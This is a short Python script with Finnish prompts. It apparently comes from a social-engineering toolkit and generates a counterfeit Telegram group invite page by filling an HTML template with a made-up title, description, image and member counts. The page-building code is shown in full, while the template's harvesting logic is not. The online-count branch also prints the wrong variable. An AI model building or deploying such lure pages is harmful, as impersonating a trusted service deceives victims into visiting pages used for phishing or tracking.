#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # punainen
G = '\033[32m' # vihreä
C = '\033[36m' # syväsininen
W = '\033[0m'  # valkoinen

title = os.getenv('TITLE')
image = os.getenv('IMAGE')
desc = os.getenv('DESC')
mem_num = os.getenv('MEM_NUM')
online_num = os.getenv('ONLINE_NUM')

if title is None:
    title = input(f'{G}[+] {C}Ryhmäotsikko : {W}')
else:
    utils.print(f'{G}[+] {C}Ryhmäotsikko :{W} '+title)

if image is None:
    image = input(f'{G}[+] {C}Kuvan polku (Paras koko: 300x300): {W}')
else:
    utils.print(f'{G}[+] {C}Kuva :{W} '+image)

if desc is None:
    desc = input(f'{G}[+] {C}Ryhmäkuvaus: {W}')
else:
    utils.print(f'{G}[+] {C}Ryhmäkuvaus :{W} '+desc)

if mem_num is None:
    mem_num = input(G + '[+]' + C + ' Jäsenten määrä : ' + W)
else:
    utils.print(f'{G}[+] {C}Jäsenten määrä :{W} '+mem_num)

if online_num is None:
    online_num = input(G + '[+]' + C + ' Jäsenten määrä verkossa : ' + W)
else:
    utils.print(f'{G}[+] {C}Jäsenten määrä verkossa :{W} '+mem_num)

img_name = utils.downloadImageFromUrl(image, 'template/telegram/images/')
if img_name :
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    try:
        shutil.copyfile(image, 'template/telegram/images/{}'.format(img_name))
    except Exception as e:
        utils.print('\n' + R + '[-]' + C + ' Poikkeus : ' + W + str(e))
        exit()

with open('template/telegram/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$DESC$', desc)
    code = code.replace('$MEMBERS$', mem_num)
    code = code.replace('$ONLINE$', online_num)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/telegram/index.html', 'w') as new_index:
    new_index.write(code)
